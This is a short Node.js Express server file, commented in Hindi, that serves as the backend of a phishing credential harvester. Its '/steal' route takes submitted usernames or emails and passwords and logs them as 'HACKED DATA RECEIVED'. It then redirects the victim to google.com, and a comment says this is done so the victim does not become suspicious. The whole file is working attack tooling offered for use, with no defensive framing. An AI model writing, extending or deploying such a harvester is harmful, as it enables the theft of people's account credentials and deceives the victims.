const express = require('express');
const app = express();
const PORT = process.env.PORT || 8000;

app.use(express.urlencoded({ extended: true }));
app.use(express.json());

// क्रेडेंशियल्स रिसीव करने के लिए रूट
app.post('/steal', (req, res) => {
    console.log("=== HACKED DATA RECEIVED ===");
    console.log("Username/Email:", req.body.username || req.query.username);
    console.log("Password:", req.body.password || req.query.password);
    console.log("============================");
    
    // पीड़ित को शक न हो इसलिए उसे असली साइट पर रीडायरेक्ट कर दें
    res.redirect('https://google.com'); 
});
app.get('/', (req, res) => {
    res.send('Server is Up and Running 24/7!');
});

app.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
});
